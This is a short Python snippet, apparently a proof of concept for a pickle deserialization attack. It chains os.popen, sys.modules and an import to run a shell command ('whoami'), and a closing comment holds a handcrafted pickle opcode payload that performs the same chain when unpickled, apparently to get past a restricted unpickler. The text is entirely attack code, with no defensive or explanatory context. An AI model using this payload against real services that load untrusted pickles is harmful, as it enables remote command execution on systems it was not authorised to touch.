from sys import modules
from os import popen

a = popen("whoami")
modules["exp"] = a

from exp import read

read()
# os.popen("whoami").read()

# b'csys\nmodules\np0\ncos\npopen\np1\ng1\n(Vwhoami\ntRp2\ng0\n(Vexp\ng2\nucexp\nread\np3\ng3\n(tR.'